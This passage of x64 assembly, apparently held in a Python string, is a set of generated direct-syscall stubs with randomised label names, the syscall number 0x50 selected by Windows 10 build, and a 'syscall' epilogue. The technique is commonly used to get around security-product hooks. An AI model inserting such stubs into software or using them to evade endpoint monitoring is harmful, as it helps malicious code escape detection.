	jmp XnnlWrMywNrFZycU_Epilogue
XnnlWrMywNrFZycU_SystemCall_10_0_19041:        
	mov eax, 0x0050
	jmp XnnlWrMywNrFZycU_Epilogue
XnnlWrMywNrFZycU_SystemCall_10_0_19042:        
	mov eax, 0x0050
	jmp XnnlWrMywNrFZycU_Epilogue
XnnlWrMywNrFZycU_SystemCall_Unknown:           
	ret
XnnlWrMywNrFZycU_Epilogue:
	mov r10, rcx
	nop
    nop
    syscall
    nop
	ret
    """